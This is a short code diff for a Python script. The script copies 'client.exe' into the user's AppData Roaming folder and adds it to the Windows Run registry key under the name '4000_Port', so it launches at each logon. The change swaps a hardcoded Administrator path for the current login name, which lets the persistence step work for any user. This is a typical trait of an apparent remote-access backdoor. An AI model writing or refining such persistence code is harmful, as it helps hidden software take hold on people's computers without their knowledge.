@@ -24,9 +24,10 @@ def main():
 if __name__ == "__main__":
     import winreg
     import os
-    os.system("copy client.exe C:\\Users\\Administrator\\AppData\\Roaming")
+    username = os.getlogin()
+    os.system(f"copy client.exe C:\\Users\\{username}\\AppData\\Roaming")
     key = winreg.HKEY_CURRENT_USER
     key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-    winreg.SetValueEx(winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS), "4000_Port", 0, winreg.REG_SZ, f"C:\\Users\\Administrator\\AppData\\Roaming\\client.exe")
+    winreg.SetValueEx(winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS), "4000_Port", 0, winreg.REG_SZ, f"C:\\Users\\{username}\\AppData\\Roaming\\client.exe")
     
     main()
